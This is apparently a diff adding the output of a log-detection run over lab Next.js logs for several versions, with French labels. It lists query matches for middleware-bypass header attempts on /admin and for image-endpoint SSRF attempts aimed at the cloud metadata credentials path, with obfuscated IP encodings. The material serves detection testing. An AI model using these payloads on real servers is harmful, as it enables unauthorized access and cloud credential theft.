@@ -1,0 +1,81 @@
+109 événements chargés
+
+-- SELECT * FROM logs WHERE x_middleware_subrequest REGEXP '.+'...
+   12 correspondance(s)
+    variants/latest.log GET /admin 307  | x
+    variants/latest.log GET /admin 200  | foo:middleware:middleware:middleware:middleware:middleware
+    variants/latest.log GET /admin 307  | middleware : middleware : middleware : middleware : middleware
+    variants/latest.log GET /admin 200  | middleware:middleware:middleware:middleware:middleware
+    variants/15.5.6.log GET /admin 307  | x
+    variants/15.5.6.log GET /admin 307  | foo:middleware:middleware:middleware:middleware:middleware
+    variants/15.5.6.log GET /admin 307  | middleware : middleware : middleware : middleware : middleware
+    variants/15.5.6.log GET /admin 307  | middleware:middleware:middleware:middleware:middleware
+    variants/16.1.7.log GET /admin 307  | x
+    variants/16.1.7.log GET /admin 307  | foo:middleware:middleware:middleware:middleware:middleware
+    variants/16.1.7.log GET /admin 307  | middleware : middleware : middleware : middleware : middleware
+    variants/16.1.7.log GET /admin 307  | middleware:middleware:middleware:middleware:middleware
+
+-- SELECT * FROM logs WHERE uri LIKE '%/\_next/image%' ESCAPE '\' AND (uri LIKE '%169.254.169.254%' ESCAPE '\' OR...
+   30 correspondance(s)
+    variants/latest.log GET /_next/image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&w=64&q=75 400  | 
+    variants/latest.log GET /_next/image?url=http://2852039166/latest/meta-data/iam/security-credentials/&w=64&q=75 400  | 
+    variants/latest.log GET /_next/image?url=http://0xa9fea9fe/latest/meta-data/iam/security-credentials/&w=64&q=75 400  | 
+    variants/latest.log GET /_next/image?url=http://[::ffff:169.254.169.254]/latest/meta-data/iam/security-credentials/&w=64&q=75 400  | 
+    variants/latest.log GET /_next/image?url=%68%74%74%70%3a%2f%2f%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34%2f%6c%61%74%65%73%74%2f&w=64&q=75 400  | 
+    variants/latest.log GET /_next/image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&w=64&q=75 400  | 
+    variants/latest.log GET /_next/image?url=http://2852039166/latest/meta-data/iam/security-credentials/&w=64&q=75 400  | 
+    variants/latest.log GET /_next/image?url=http://0xa9fea9fe/latest/meta-data/iam/security-credentials/&w=64&q=75 400  | 
+    variants/latest.log GET /_next/image?url=http://[::ffff:169.254.169.254]/latest/meta-data/iam/security-credentials/&w=64&q=75 400  | 
+    variants/latest.log GET /_next/image?url=%68%74%74%70%3a%2f%2f%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34%2f%6c%61%74%65%73%74%2f&w=64&q=75 400  | 
+    variants/15.5.6.log GET /_next/image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&w=64&q=75 400  | 
+    variants/15.5.6.log GET /_next/image?url=http://2852039166/latest/meta-data/iam/security-credentials/&w=64&q=75 400  | 
+    variants/15.5.6.log GET /_next/image?url=http://0xa9fea9fe/latest/meta-data/iam/security-credentials/&w=64&q=75 400  | 
+    variants/15.5.6.log GET /_next/image?url=http://[::ffff:169.254.169.254]/latest/meta-data/iam/security-credentials/&w=64&q=75 400  | 
+    variants/15.5.6.log GET /_next/image?url=%68%74%74%70%3a%2f%2f%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34%2f%6c%61%74%65%73%74%2f&w=64&q=75 400  | 
+    variants/15.5.6.log GET /_next/image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&w=64&q=75 400  | 
+    variants/15.5.6.log GET /_next/image?url=http://2852039166/latest/meta-data/iam/security-credentials/&w=64&q=75 400  | 
+    variants/15.5.6.log GET /_next/image?url=http://0xa9fea9fe/latest/meta-data/iam/security-credentials/&w=64&q=75 400  | 
+    variants/15.5.6.log GET /_next/image?url=http://[::ffff:169.254.169.254]/latest/meta-data/iam/security-credentials/&w=64&q=75 400  | 
+    variants/15.5.6.log GET /_next/image?url=%68%74%74%70%3a%2f%2f%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34%2f%6c%61%74%65%73%74%2f&w=64&q=75 400  | 
+    variants/16.1.7.log GET /_next/image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&w=64&q=75 400  | 
+    variants/16.1.7.log GET /_next/image?url=http://2852039166/latest/meta-data/iam/security-credentials/&w=64&q=75 400  | 
+    variants/16.1.7.log GET /_next/image?url=http://0xa9fea9fe/latest/meta-data/iam/security-credentials/&w=64&q=75 400  | 
+    variants/16.1.7.log GET /_next/image?url=http://[::ffff:169.254.169.254]/latest/meta-data/iam/security-credentials/&w=64&q=75 400  | 
+    variants/16.1.7.log GET /_next/image?url=%68%74%74%70%3a%2f%2f%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34%2f%6c%61%74%65%73%74%2f&w=64&q=75 400  | 
+    variants/16.1.7.log GET /_next/image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&w=64&q=75 400  | 
+    variants/16.1.7.log GET /_next/image?url=http://2852039166/latest/meta-data/iam/security-credentials/&w=64&q=75 400  | 
+    variants/16.1.7.log GET /_next/image?url=http://0xa9fea9fe/latest/meta-data/iam/security-credentials/&w=64&q=75 400  | 
+    variants/16.1.7.log GET /_next/image?url=http://[::ffff:169.254.169.254]/latest/meta-data/iam/security-credentials/&w=64&q=75 400  | 
+    variants/16.1.7.log GET /_next/image?url=%68%74%74%70%3a%2f%2f%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34%2f%6c%61%74%65%73%74%2f&w=64&q=75 400  | 
+
+-- SELECT * FROM logs WHERE message LIKE '%isn''t a valid image for%' ESCAPE '\' AND (message LIKE '%169.254.169....
+   10 correspondance(s)
+    variants/latest.log [next.js]    15.2.2 permissive next.log:  ⨯ The requested resource isn't a valid image for http://169.254.169.254/latest/meta-data/iam/security-credentials/ received text/html | 
+    variants/latest.log [next.js]    15.2.2 permissive next.log:  ⨯ The requested resource isn't a valid image for http://169.254.169.254/latest/meta-data/iam/security-credentials/ received text/html | 
+    variants/latest.log [next.js]    15.2.2 permissive next.log:  ⨯ The requested resource isn't a valid image for http://169.254.169.254/latest/meta-data/iam/security-credentials/ received text/html | 
+    variants/latest.log [next.js]    15.2.2 permissive next.log:  ⨯ The requested resource isn't a valid image for http://[::ffff:a9fe:a9fe]/latest/meta-data/iam/security-credentials/ received text/html | 
+    variants/latest.log [next.js]    15.2.2 permissive next.log:  ⨯ The requested resource isn't a valid image for http://169.254.169.254/latest/ received text/html; charset=utf-8 | 
+    variants/15.5.6.log [next.js]    15.5.6 permissive next.log:  ⨯ The requested resource isn't a valid image for http://169.254.169.254/latest/meta-data/iam/security-credentials/ received null | 
+    variants/15.5.6.log [next.js]    15.5.6 permissive next.log:  ⨯ The requested resource isn't a valid image for http://169.254.169.254/latest/meta-data/iam/security-credentials/ received null | 
+    variants/15.5.6.log [next.js]    15.5.6 permissive next.log:  ⨯ The requested resource isn't a valid image for http://169.254.169.254/latest/meta-data/iam/security-credentials/ received null | 
+    variants/15.5.6.log [next.js]    15.5.6 permissive next.log:  ⨯ The requested resource isn't a valid image for http://[::ffff:a9fe:a9fe]/latest/meta-data/iam/security-credentials/ received null | 
+    variants/15.5.6.log [next.js]    15.5.6 permissive next.log:  ⨯ The requested resource isn't a valid image for http://169.254.169.254/latest/ received null | 
+
+-- SELECT * FROM logs WHERE message LIKE '%upstream image%' ESCAPE '\' AND message LIKE '%resolved to private ip%...
+   7 correspondance(s)
+    variants/16.1.7.log [next.js]    16.1.7 permissive next.log: ⨯ upstream image http://169.254.169.254/latest/meta-data/iam/security-credentials/ resolved to private ip ["169.254.169.254"] | 
+    variants/16.1.7.log [next.js]    16.1.7 permissive next.log: ⨯ upstream image http://169.254.169.254/latest/meta-data/iam/security-credentials/ resolved to private ip ["169.254.169.254"] | 
+    variants/16.1.7.log [next.js]    16.1.7 permissive next.log: ⨯ upstream image http://169.254.169.254/latest/meta-data/iam/security-credentials/ resolved to private ip ["169.254.169.254"] | 
+    variants/16.1.7.log [next.js]    16.1.7 permissive next.log: ⨯ upstream image http://[::ffff:a9fe:a9fe]/latest/meta-data/iam/security-credentials/ resolved to private ip ["[::ffff:a9fe:a9fe]"] | 
+    variants/16.1.7.log [next.js]    16.1.7 permissive next.log: ⨯ upstream image http://169.254.169.254/latest/ resolved to private ip ["169.254.169.254"] | 
+    variants/16.1.7.log [next.js]    16.1.7 permissive next.log: ⨯ upstream image http://imds-alias.lab/latest/meta-data/iam/security-credentials/ resolved to private ip ["169.254.169.254"] | 
+    variants/16.1.7.log [next.js]    16.1.7 permissive next.log: ⨯ upstream image http://127.0.0.5/r resolved to private ip ["127.0.0.5"] | 
+
+-- SELECT * FROM logs WHERE message LIKE '%The Server Reference ID did not match the expected format%' ESCAPE '\'...
+   5 correspondance(s)
+    variants/16.1.7.log [next.js]    16.1.7 default next.log: ⨯ Error: Failed to find Server Action. This request might be from an older or newer deployment. | 
+    variants/16.1.7.log [next.js]    16.1.7 default next.log: ⨯ Error: Failed to find Server Action. This request might be from an older or newer deployment. | 
+    variants/16.1.7.log [next.js]    16.1.7 default next.log: ⨯ Error: Failed to find Server Action. This request might be from an older or newer deployment. | 
+    variants/16.1.7.log [next.js]    16.1.7 default next.log: ⨯ Error: Failed to find Server Action. This request might be from an older or newer deployment. | 
+    variants/16.1.7.log [next.js]    16.1.7 default next.log: Error: Failed to find Server Action "x". This request might be from an older or newer deployment. | 
+
